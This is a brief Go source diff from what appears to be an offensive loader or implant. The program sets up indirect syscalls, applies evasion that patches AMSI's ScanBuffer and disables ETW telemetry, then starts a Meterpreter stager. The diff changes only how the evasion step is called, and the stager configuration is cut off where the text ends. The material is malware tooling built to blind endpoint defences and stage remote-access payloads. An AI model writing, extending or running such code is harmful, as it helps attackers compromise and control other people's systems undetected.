@@ -141,7 +141,7 @@ func main() {
     // Phase 1: Evasion
     caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewTartarus())
     defer caller.Close()
-    evasion.Apply(caller, amsi.Technique(), etw.Technique())
+    evasion.ApplyAll([]evasion.Technique{amsi.ScanBufferPatch(), etw.All()}, caller)
 
     // Phase 2: Stage Meterpreter
     stager := meterpreter.NewStager(&meterpreter.Config{
